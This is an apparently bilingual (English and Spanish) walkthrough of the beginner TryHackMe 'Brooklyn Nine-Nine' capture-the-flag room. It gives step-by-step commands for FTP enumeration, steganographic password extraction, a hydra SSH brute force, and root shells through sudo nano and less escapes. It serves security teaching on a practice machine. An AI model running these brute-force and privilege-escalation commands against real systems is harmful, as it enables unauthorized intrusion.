@@ -1,0 +1,264 @@
+Brooklyn Nine-Nine user-fiendly THM Walkthrough
+Room: Brooklyn Nine-Nine
+Difficulty: Easy
+Creator: Fsociety2006
+Objective: Find the user flag and root flag.
+
+This CTF is based on the popular TV series Brooklyn Nine-Nine. It’s a beginner-friendly box that teaches FTP enumeration, steganography, SSH brute-forcing, and two different paths for privilege escalation.
+
+Step 1: Reconnaissance
+The first step is to identify open ports and running services on the target machine.
+
+
+nmap -sC -sV -p- <target-ip> -oN scan.txt
+Nmap results:
+
+21/tcp FTP vsftpd 3.0.3
+22/tcp SSH OpenSSH 7.6p1 Ubuntu
+80/tcp HTTP Apache httpd 2.4.29 ((Ubuntu))
+
+Three ports are open. Anonymous login is enabled on FTP.
+
+Step 2: Web Enumeration
+Visiting http://<target-ip> displays a single image of the Brooklyn Nine-Nine cast. Nothing else is visible on the page.
+
+Viewing the page source (Ctrl+U) reveals a comment:
+
+"Have you ever heard of steganography?"
+
+This is a strong hint that the image might contain hidden data.
+
+Step 3: FTP Enumeration
+FTP allows anonymous login (username: anonymous, password: blank). Let’s connect and check what’s there.
+
+
+ftp <target-ip>
+# Username: anonymous
+# Password: (blank)
+Inside the FTP directory, there is a file named note_to_jake.txt.
+
+
+get note_to_jake.txt
+cat note_to_jake.txt
+Content of note_to_jake.txt:
+
+"From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine."
+
+This tells us three user accounts exist (jake, holt, amy) and that Jake’s password is weak.
+
+Step 4: Steganography
+Based on the hint in the page source, the brooklyn99.jpg image likely contains hidden data. Let’s download it and extract the hidden content using steghide.
+
+
+wget http://<target-ip>/brooklyn99.jpg
+steghide extract -sf brooklyn99.jpg
+When prompted for a passphrase, leave it blank and press Enter. It extracts a file called note.txt.
+
+
+cat note.txt
+Output:
+Holt's password: fluffydog12@ninenine
+
+Now we have valid SSH credentials for user holt!
+
+Step 5: SSH Access (User Flag)
+Use the credentials to log in via SSH.
+
+
+ssh holt@<target-ip>
+Once logged in, check holt’s home directory.
+
+
+ls -la
+cat user.txt
+This gives us the user flag.
+
+Step 6: Privilege Escalation to Root
+Now that we have access to holt, let’s check which commands holt can run with sudo.
+
+
+sudo -l
+Output:
+User holt may run the following commands on brooklyn99: (ALL) NOPASSWD: /bin/nano
+
+We can run nano as root. This is a privilege escalation vector. According to GTFOBins, we can exploit nano to spawn a root shell:
+
+Run sudo nano
+
+Inside nano, press Ctrl+R (read file)
+
+Press Ctrl+X (execute command)
+
+Enter: reset; sh 1>&0 2>&0
+
+
+sudo /bin/nano
+# Ctrl+R, then Ctrl+X, then type:
+reset; sh 1>&0 2>&0
+You are now root! Verify with id or whoami.
+
+Step 7: Root Flag
+Navigate to the root directory and read the flag.
+
+
+cd /root
+cat root.txt
+This gives us the root flag.
+
+Alternative Path: Brute-Forcing Jake’s Password
+If you prefer a different approach, you can also brute-force Jake’s SSH password using hydra.
+
+
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
+The password is 987654321. Once logged in, check sudo -l — Jake can run less as root.
+
+
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/less
+From there, use this GTFOBins command to get root access:
+
+
+sudo less /etc/profile
+!/bin/sh
+This spawns a root shell and allows you to capture the same root flag.
+
+Conclusion
+The Brooklyn Nine-Nine room is a great beginner CTF that covers:
+
+Port scanning with Nmap
+Anonymous FTP enumeration
+Web source inspection
+Image steganography with steghide
+SSH brute-forcing with hydra
+Two distinct privilege escalation vectors (nano and less) using GTFOBins
+Capturing user and root flags
+
+
+ES VERSIÓN EN ESPAÑOL
+Brooklyn Nine-Nine - Guía Paso a Paso de THM
+Introducción
+Sala: Brooklyn Nine-Nine
+Dificultad: Fácil
+Creador: Fsociety2006
+Objetivo: Encontrar la bandera de usuario y la bandera de root.
+
+Este CTF está basado en la popular serie de televisión Brooklyn Nine-Nine. Es una máquina ideal para principiantes que enseña enumeración FTP, esteganografía, fuerza bruta SSH y dos rutas diferentes para escalar privilegios.
+
+Paso 1: Reconocimiento
+El primer paso es identificar los puertos abiertos y los servicios que se ejecutan en la máquina objetivo.
+
+
+nmap -sC -sV -p- <ip-objetivo> -oN scan.txt
+Resultados de Nmap:
+
+21/tcp FTP vsftpd 3.0.3
+22/tcp SSH OpenSSH 7.6p1 Ubuntu
+80/tcp HTTP Apache httpd 2.4.29 ((Ubuntu))
+
+Hay tres puertos abiertos. El FTP permite inicio de sesión anónimo.
+
+Paso 2: Enumeración web
+Visitando http://<ip-objetivo> se muestra una sola imagen del elenco de Brooklyn Nine-Nine. No hay nada más visible en la página.
+
+Al ver el código fuente de la página (Ctrl+U) aparece un comentario:
+
+"¿Alguna vez has oído hablar de esteganografía?"
+
+Esto es una fuerte pista de que la imagen podría contener datos ocultos.
+
+Paso 3: Enumeración FTP
+El FTP permite acceso anónimo (usuario: anonymous, contraseña: vacío). Conectémonos y veamos qué hay.
+
+
+ftp <ip-objetivo>
+# Usuario: anonymous
+# Contraseña: (vacío)
+Dentro del directorio FTP hay un archivo llamado note_to_jake.txt.
+
+
+get note_to_jake.txt
+cat note_to_jake.txt
+Contenido de note_to_jake.txt:
+
+"From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine."
+
+Esto nos indica que existen tres usuarios (jake, holt, amy) y que la contraseña de Jake es débil.
+
+Paso 4: Esteganografía
+Basándonos en la pista del código fuente, la imagen brooklyn99.jpg probablemente contiene datos ocultos. Descarguémosla y extraigamos el contenido usando steghide.
+
+wget http://<ip-objetivo>/brooklyn99.jpg
+steghide extract -sf brooklyn99.jpg
+Cuando pida una contraseña, la dejamos en blanco y presionamos Enter. Extraerá un archivo llamado note.txt.
+
+cat note.txt
+Salida:
+Holt's password: fluffydog12@ninenine
+
+¡Ahora tenemos credenciales SSH válidas para el usuario holt!
+
+Paso 5: Acceso SSH (Bandera de usuario)
+Usamos las credenciales para iniciar sesión por SSH.
+
+ssh holt@<ip-objetivo>
+Una vez dentro, revisamos el directorio personal de holt.
+
+ls -la
+cat user.txt
+Esto nos da la bandera de usuario.
+
+Paso 6: Escalada de privilegios a root
+Ahora que tenemos acceso como holt, veamos qué comandos puede ejecutar con sudo.
+
+sudo -l
+Salida:
+User holt may run the following commands on brooklyn99: (ALL) NOPASSWD: /bin/nano
+
+Podemos ejecutar nano como root. Esto es un vector de escalada de privilegios. Según GTFOBins, podemos explotar nano para obtener una shell de root:
+
+Ejecutamos sudo nano
+
+Dentro de nano, presionamos Ctrl+R (leer archivo)
+
+Presionamos Ctrl+X (ejecutar comando)
+
+Escribimos: reset; sh 1>&0 2>&0
+
+sudo /bin/nano
+# Ctrl+R, luego Ctrl+X, luego escribimos:
+reset; sh 1>&0 2>&0
+¡Ya somos root! Lo verificamos con id o whoami.
+
+Paso 7: Bandera de root
+Navegamos al directorio raíz y leemos la bandera.
+
+cd /root
+cat root.txt
+Esto nos da la bandera de root.
+
+Ruta alternativa: Fuerza bruta a la contraseña de Jake
+Si prefieres otro enfoque, también puedes aplicar fuerza bruta a la contraseña SSH de Jake usando hydra.
+
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<ip-objetivo> -t 4
+La contraseña es 987654321. Una vez conectado, verificamos sudo -l: Jake puede ejecutar less como root.
+
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/less
+Desde ahí, usamos este comando de GTFOBins para obtener acceso root:
+
+sudo less /etc/profile
+!/bin/sh
+Esto abre una shell de root y te permite capturar la misma bandera de root.
+
+Conclusión
+La sala Brooklyn Nine-Nine es un CTF fantástico para principiantes que cubre:
+
+Escaneo de puertos con Nmap
+Enumeración FTP anónima
+Inspección de código fuente web
+Esteganografía de imágenes con steghide
+Fuerza bruta SSH con hydra
+Dos vectores distintos de escalada de privilegios (nano y less) usando GTFOBins
+Captura de banderas de usuario y root
+
+Nine Nine!!!!
